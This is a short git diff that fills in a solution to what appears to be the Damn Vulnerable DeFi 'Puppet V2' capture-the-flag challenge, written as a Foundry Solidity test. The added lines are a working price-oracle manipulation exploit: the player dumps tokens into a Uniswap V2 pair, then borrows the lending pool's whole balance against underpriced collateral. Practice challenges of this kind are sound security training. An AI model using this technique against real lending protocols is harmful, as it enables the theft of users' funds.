@@ -98,7 +98,16 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        token.transfer(address(uniswapV2Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Exchange.swap(99e17, 0, player, "");
+        // (uint a,uint b,) = uniswapV2Exchange.getReserves();
+        // console.log(a);
+        // console.log(b);
+        weth.deposit{value:PLAYER_INITIAL_ETH_BALANCE}();
+        // console.log(weth.balanceOf(player));
+        weth.approve(address(lendingPool), 30e18);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -109,3 +118,4 @@ contract PuppetV2Challenge is Test {
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
